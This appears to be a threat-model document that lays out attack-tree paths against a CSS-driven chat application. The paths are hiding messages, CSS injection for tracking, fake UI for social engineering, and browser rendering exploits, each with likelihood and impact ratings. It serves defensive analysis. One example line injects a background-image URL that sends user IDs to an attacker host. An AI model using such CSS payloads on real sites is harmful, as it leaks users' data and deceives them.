## Attack Tree Path: [Disrupt Conversation Flow](./attack_tree_paths/disrupt_conversation_flow.md)

**Goal:** To make the chat unusable or significantly degrade its usefulness by disrupting the flow of communication.
* **Mechanism:** Exploiting the CSS-driven nature of the chat to manipulate the visibility and order of messages.
* **Critical Node: Hide Messages**
    * **How:** Craft CSS to use `display: none;` or other techniques to make specific messages invisible. This can be done by targeting specific message containers based on CSS selectors.
    * **Likelihood:** High
    * **Impact:** Minor (individually), but can become Moderate when used persistently or in conjunction with other manipulations.
    * **Effort:** Minimal
    * **Skill Level:** Novice
    * **Detection Difficulty:** Easy (users will notice missing messages).
    * **Impact of the Path:**  While individually hiding a message is minor, systematically hiding messages from specific users or time periods can significantly disrupt the conversation, spread misinformation by selectively removing dissenting voices, or make the chat appear broken.

## Attack Tree Path: [CSS Injection for Tracking](./attack_tree_paths/css_injection_for_tracking.md)

**Goal:** To exfiltrate information about users or their actions within the application without direct access to the server-side data.
* **Mechanism:** Injecting CSS that triggers external requests to attacker-controlled servers, embedding user-specific data within the request URLs.
* **Critical Node: Trigger External Requests with User-Specific Data**
    * **How:** Inject CSS that uses properties like `background-image`, `list-style-image`, or custom CSS properties with URLs that include potentially sensitive information. For example, `background-image: url('https://attacker.com/log?user_id=[USER_ID]&message_count=[MESSAGE_COUNT]');`. The browser will attempt to load these resources, sending the data to the attacker's server.
    * **Likelihood:** Medium
    * **Impact:** Moderate (leakage of user IDs, message counts, potentially more sensitive information depending on application state).
    * **Effort:** Low
    * **Skill Level:** Beginner
    * **Detection Difficulty:** Moderate (requires network monitoring and analysis of outbound requests).
    * **Impact of the Path:** Successful tracking can reveal user activity patterns, identify active users, and potentially expose sensitive information that can be used for further attacks or profiling.

## Attack Tree Path: [CSS for Social Engineering](./attack_tree_paths/css_for_social_engineering.md)

**Goal:** To trick users into performing actions that benefit the attacker, such as revealing credentials or visiting malicious websites.
* **Mechanism:** Crafting CSS to visually mimic legitimate UI elements or warnings, leading users to believe they are interacting with the genuine application.
* **Critical Node: CSS for Social Engineering**
    * **How:** Craft CSS to mimic legitimate UI elements (e.g., login forms, password reset prompts, security warnings) that, while not fully functional through CSS alone, can visually deceive users into clicking on links or entering information into fake forms (which would then be handled by other means outside of the CSS-only chat itself, but initiated by the visual deception).
    * **Likelihood:** Low
    * **Impact:** Significant (credential theft, redirection to malware sites, other forms of social engineering).
    * **Effort:** Medium
    * **Skill Level:** Intermediate
    * **Detection Difficulty:** Moderate (relies on user awareness and the ability to distinguish between the real and fake UI elements).
    * **Impact of the Path:** Successful social engineering can have severe consequences, leading to account compromise and further exploitation of the user or the application.

## Attack Tree Path: [Exploit Browser Rendering Bugs](./attack_tree_paths/exploit_browser_rendering_bugs.md)

**Goal:** To execute arbitrary code on the user's machine or cause a denial of service by exploiting vulnerabilities in the browser's rendering engine.
* **Mechanism:** Crafting specific CSS that triggers known or zero-day vulnerabilities in the way the browser interprets and renders CSS.
* **Attack Vector: Craft Specific CSS to Trigger Browser Vulnerabilities**
    * **How:**  This involves deep technical knowledge of browser internals and specific vulnerabilities. The attacker crafts CSS with specific properties or combinations of properties that exploit flaws in the browser's rendering logic.
    * **Likelihood:** Very Low (requires specific browser vulnerabilities).
    * **Impact:** Critical (potentially arbitrary code execution on the user's machine, complete compromise of the client).
    * **Effort:** Very High
    * **Skill Level:** Expert
    * **Detection Difficulty:** Difficult (might be detected by endpoint security solutions if code execution occurs, but the CSS itself might be hard to identify as malicious without specific vulnerability signatures).
    * **Impact of the Path:**  Successful exploitation of browser rendering bugs can have catastrophic consequences, allowing the attacker to gain complete control over the user's machine. While the likelihood is low, the potential impact necessitates its inclusion as a high-risk path.
